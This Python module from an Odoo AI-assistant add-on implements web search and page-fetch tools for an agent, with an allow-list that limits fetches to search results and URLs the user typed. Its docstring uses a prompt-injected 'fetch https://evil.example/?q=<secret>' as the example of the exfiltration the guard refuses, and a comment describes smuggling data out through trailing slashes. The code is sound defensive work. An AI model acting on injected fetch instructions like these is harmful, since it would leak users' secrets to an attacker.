# -*- coding: utf-8 -*-
"""``web.search`` and ``web.fetch``: search the public web and read one page.

HTTP and parsing live in ``utils/websearch.py`` (the SearXNG client) and
``utils/webfetch.py`` (SSRF guard, fetch, HTML to text); this module only
holds the tool logic:

- the turn's source table ``ctx.state['web_sources']``
  (``{"1": {"url", "title", "host"}}``, string keys: the state is stored as
  JSON) that numbers the results for ``[WEB_SOURCE:n]`` citations, and the
  per-turn call counts ``ctx.state['web_counts']`` (attempts: the engine
  keeps them after a failed call too); the engine starts and
  ends every turn without both keys (``engine/loop.py::TURN_STATE_KEYS``)
  and renders the citations of the answer from the table
  (``engine/html_output.py::render_ai_markdown``);
- the fetch allow-list: a page is only read when its URL is in the source
  table or appears in one of the user's own messages of this session, so a
  prompt-injected "fetch https://evil.example/?q=<secret>" is refused before
  any request is made.
"""
from __future__ import annotations

import json
import re
from urllib.parse import urlsplit, urlunsplit

from odoo.exceptions import UserError

from ..engine.tools_registry import ToolResult, _max_tool_result_chars, builtin_tool
from ..utils import params, webfetch, websearch
from ..utils.serialize import compact_json
from ..utils.webfetch import WebFetchError
from ..utils.websearch import WebSearchError

_SEARCH_LIMIT = 5
_FETCH_LIMIT = 5
_URL_RE = re.compile(r'(?i)https?://[^\s<>"\'\]]+')
_TRAILING_PUNCTUATION = '.,;:!?”’»\'"'
_MAX_TITLE_CHARS = 200
_MAX_SUMMARY_QUERY_CHARS = 200
_REFUSED_TEXT = "Only pages from search results or from the user's message can be fetched."
_FETCH_ERROR_REASONS = {
    'bad_url': "invalid URL",
    'blocked': "blocked address",
    'too_many_redirects': "too many redirects",
    'timeout': "timeout",
    'unreachable': "unreachable",
    'http_error': "HTTP error",
    'unsupported_content': "unsupported content type",
}


def _sources(ctx):
    return ctx.state.setdefault('web_sources', {})


def _count(ctx, kind, limit):
    """Count one ``kind`` call of this turn before it runs, or refuse it past ``limit``."""
    counts = ctx.state.setdefault('web_counts', {})
    if counts.get(kind, 0) >= limit:
        # run_tool turns a UserError into a failed result for the model.
        raise UserError(f"Web {kind} limit reached for this turn ({limit}).")
    counts[kind] = counts.get(kind, 0) + 1


def _next_number(sources):
    return str(max((int(key) for key in sources), default=0) + 1)


def _host(url):
    """The bare, lower-case host name of ``url`` (no user info, no port)."""
    try:
        return urlsplit(url).hostname or ''
    except ValueError:
        return ''


def _search_summary(query, count):
    """The chat line of a search: the query (cut to ``_MAX_SUMMARY_QUERY_CHARS``) and the result count."""
    if len(query) > _MAX_SUMMARY_QUERY_CHARS:
        query = query[:_MAX_SUMMARY_QUERY_CHARS - 1] + '…'
    results = "1 result" if count == 1 else f"{count} results"
    return {'icon': 'search', 'text': f"Searched the web for “{query}” ({results})"}


def _unresponsive_text(engines):
    names = []
    for engine in engines:
        if isinstance(engine, (list, tuple)) and len(engine) >= 2:
            names.append(f"{engine[0]} ({engine[1]})")
        elif engine:
            names.append(str(engine))
    return ', '.join(names)


@builtin_tool('web.search')
def web_search(ctx, query, count=None, time_range=None, site=None):
    """Search the web through SearXNG; every result gets a source number for citations."""
    _count(ctx, 'search', _SEARCH_LIMIT)
    if count:
        count = min(count, params.get_int(ctx.env, 'ow_ai.web_search_results', 5))
    try:
        data = websearch.search(ctx.env, query, count=count, time_range=time_range, site=site)
    except WebSearchError as exc:
        return ToolResult(response=exc.message, success=False)

    sources = _sources(ctx)
    known = {source['url']: key for key, source in sources.items()}
    results = []
    for item in data['results']:
        if _url_key(item['url']) is None or webfetch.is_blocked_literal_host(item['url']):
            # A URL the guard refuses for its syntax (not http(s), credentials,
            # bad host or port, ...) or for its IP-address host (checked
            # without DNS) can never be read: it gets no number and never
            # becomes a link in the sources list.
            continue
        key = known.get(item['url'])
        if key is None:
            key = _next_number(sources)
            sources[key] = {'url': item['url'], 'title': item['title'], 'host': _host(item['url'])}
            known[item['url']] = key
        results.append({'n': int(key), **item})

    summary = _search_summary(query, len(results))
    if not results:
        message = "No results; try other words or a broader query."
        engines = _unresponsive_text(data['unresponsive_engines'])
        if engines:
            message += f" Search engines unavailable: {engines}."
        return ToolResult(response=message, success=False, summary=summary)
    return ToolResult(
        response={'query': query, 'results': results, 'note': "Cite with [WEB_SOURCE:n]."}, summary=summary)


def _url_key(url):
    """``url`` normalised like ``webfetch.guard_url`` does (no DNS) minus one trailing slash; None if invalid.

    Only one slash: were any number of them ignored, the count of slashes
    appended to an allowed URL could carry data out.
    """
    try:
        parts = urlsplit(webfetch.normalise_url(url))
    except WebFetchError:
        return None
    path = parts.path[:-1] if parts.path.endswith('/') else parts.path
    return urlunsplit(parts._replace(path=path))


def _trim_url(url):
    """``url`` without the sentence punctuation typed after it, and without a closing
    parenthesis that has no opening one in the URL (``(see https://x/y)``)."""
    while True:
        trimmed = url.rstrip(_TRAILING_PUNCTUATION)
        if trimmed.endswith(')') and trimmed.count(')') > trimmed.count('('):
            trimmed = trimmed[:-1]
        if trimmed == url:
            return url
        url = trimmed


def _user_urls(ctx):
    """Every URL in the text the user typed in this session (never tool results or agent text)."""
    if not ctx.session_id:
        return []
    # The event log is system-only; the session id comes from the engine, never from the model.
    session = ctx.env['ow.ai.session'].sudo().browse(ctx.session_id).exists()
    if not session:
        return []
    urls = []
    for message in session._get_history_messages():
        if message.get('role') != 'user':
            continue
        for part in message.get('content') or []:
            if part.get('type') != 'text':
                continue
            for match in _URL_RE.findall(part.get('text') or ''):
                urls += [match, _trim_url(match)]
    return urls


def _source_number(sources, *urls):
    keys = {_url_key(url) for url in urls} - {None}
    return next((key for key, source in sources.items() if _url_key(source['url']) in keys), None)


def _page_text(page):
    """``(title, text)`` of a fetched page: pretty-printed JSON, or the text of an HTML/plain page."""
    if page.content_type == 'application/json':
        try:
            return '', json.dumps(json.loads(page.body), indent=1, ensure_ascii=False)
        except ValueError:
            pass
    title, text = webfetch.html_to_text(page.body, charset=page.charset, content_type=page.content_type)
    return title[:_MAX_TITLE_CHARS], text


def _page_response(number, title, page, text, offset, limit):
    chunk = text[offset:offset + limit]
    response = {
        'n': int(number), 'title': title, 'url': page.url, 'final_url': page.final_url, 'offset': offset,
        'returned_chars': len(chunk), 'total_chars': len(text), 'truncated': offset + len(chunk) < len(text),
    }
    if page.truncated:
        response['body_truncated'] = True   # the download itself was cut at the size cap
    response['text'] = chunk
    return response


@builtin_tool('web.fetch')
def web_fetch(ctx, url, offset=0, max_chars=8000):
    """Read one page from this turn's search results or from a URL the user typed."""
    _count(ctx, 'fetch', _FETCH_LIMIT)
    env = ctx.env
    sources = _sources(ctx)
    allowed = {_url_key(source['url']) for source in sources.values()}
    allowed.update(_url_key(user_url) for user_url in _user_urls(ctx))
    key = _url_key(url)
    if key is None or key not in allowed:
        return ToolResult(response=_REFUSED_TEXT, success=False)

    try:
        page = webfetch.fetch(
            url, timeout=params.get_int(env, 'ow_ai.web_timeout', 15),
            user_agent=f"Odoo ow_ai (+{params.get_str(env, 'web.base.url')})",
            session=websearch.get_page_session(env), resolver=websearch.get_resolver(env))
    except WebFetchError as exc:
        reason = _FETCH_ERROR_REASONS.get(exc.code, exc.code)
        return ToolResult(response=f"The page cannot be fetched ({reason}): {exc}", success=False)

    title, text = _page_text(page)
    host = _host(page.final_url)
    number = _source_number(sources, url, page.final_url)
    if number is None:
        number = _next_number(sources)
        sources[number] = {'url': page.final_url, 'title': title, 'host': host}

    max_result = _max_tool_result_chars(env)
    offset = max(offset or 0, 0)
    response = _page_response(number, title, page, text, offset, min(max_chars, max_result))
    # run_tool cuts a longer result mid-JSON (and returned_chars would lie): shorten the slice instead.
    while response['returned_chars'] and len(compact_json(response)) > max_result:
        excess = len(compact_json(response)) - max_result
        response = _page_response(number, title, page, text, offset, max(response['returned_chars'] - excess, 0))

    return ToolResult(
        response=response,
        summary={'icon': 'article', 'text': f"Read {host}: {title}" if title else f"Read {host}"})
